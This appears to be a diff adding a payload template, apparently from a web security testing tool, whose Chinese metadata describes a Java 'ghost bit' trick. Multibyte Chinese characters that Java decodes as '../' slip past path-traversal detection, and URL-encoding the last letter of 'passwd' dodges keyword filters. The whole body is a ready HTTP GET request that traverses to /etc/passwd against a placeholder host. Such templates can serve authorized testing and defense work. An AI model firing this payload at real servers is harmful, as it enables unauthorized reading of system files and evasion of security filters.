@@ -1,0 +1,11 @@
+# @name: Java-幽灵比特位-bypass
+# @color: green
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @tags: Java幽灵比特位绕过：利用UTF-8多字节中文字符在Java字节层面被解析为../的技巧绕过路径遍历检测，同时对passwd末字符做URL编码%64绕过关键字匹配
+# @intent: ghost_bit_unicode
+# @intent.replace_from: ../
+# @intent.replace_to: 阮严灵丰丰甲来/
+GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
